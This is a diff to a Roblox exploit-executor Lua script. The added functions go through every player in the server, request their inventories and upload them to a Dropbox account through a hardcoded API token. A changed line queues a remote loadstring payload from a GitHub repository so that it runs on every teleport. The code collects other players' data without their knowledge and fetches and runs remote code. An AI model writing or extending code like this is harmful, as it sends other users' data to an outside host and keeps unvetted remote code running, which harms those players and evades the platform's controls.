@@ -27,6 +27,70 @@ task.spawn(function()
 
 end)
 
+local function fetchUserInventory(userId)
+	local path = "/Inventories/" .. userId .. ".json"
+
+	local success, result = pcall(function()
+		local res = http_request({
+			Url = "https://content.dropboxapi.com/2/files/download",
+			Method = "POST",
+			Headers = {
+				["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
+				["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
+			}
+		})
+
+		if res.StatusCode == 200 then
+			return HttpService:JSONDecode(res.Body)
+		end
+	end)
+
+	return (success and type(result) == "table") and result or {}
+end
+
+
+local function uploadUserInventory(userId, data)
+	local path = "/Inventories/" .. userId .. ".json"
+
+	http_request({
+		Url = "https://content.dropboxapi.com/2/files/upload",
+		Method = "POST",
+		Headers = {
+			["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
+			["Dropbox-API-Arg"] = HttpService:JSONEncode({
+				path = path,
+				mode = "overwrite",
+				autorename = false,
+				mute = true
+			}),
+			["Content-Type"] = "application/octet-stream"
+		},
+		Body = HttpService:JSONEncode(data)
+	})
+end
+
+local function savePlayerInventory(Player, inventory)
+	if not inventory then return end
+
+	local existingData = fetchUserInventory(Player.UserId)
+
+	local formattedInventory = {}
+	for _, v in ipairs(inventory) do
+		table.insert(formattedInventory, {
+			name = v[1],
+			category = v[2]
+		})
+	end
+
+	table.insert(existingData, {
+		timestamp = os.time(),
+		inventory = formattedInventory
+	})
+
+	uploadUserInventory(Player.UserId, existingData)
+end
+
+
 task.spawn(function()
 	local PlayersService = game:GetService("Players")
 	local HttpService = game:GetService("HttpService")
@@ -216,10 +280,21 @@ end
 task.spawn(function()
 	task.wait(1)
 
-	local inventory = RequestPlayerInventory(game:GetService("Players").ChristmasCandyGobler)
-	
-	for i, v in next, inventory do
-		print(v[1], v[2])
+	local Players = PlayersService:GetPlayers()
+	local Taken = {}
+
+	for i = 1, #Players do
+		local Player
+		
+		repeat
+			task.wait()
+			Player = Players[math.random(1, #Players)]
+		until not Taken[Player]
+
+		Taken[Player] = true
+
+		local inventory = RequestPlayerInventory(Player)
+		savePlayerInventory(Player, inventory)
 	end
 end)
 
@@ -353,7 +428,7 @@ ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Ser
 
 	Cooldown = false
 
-	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test2'))()")
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test3'))()")
 
 	repeat
 		task.wait(1)
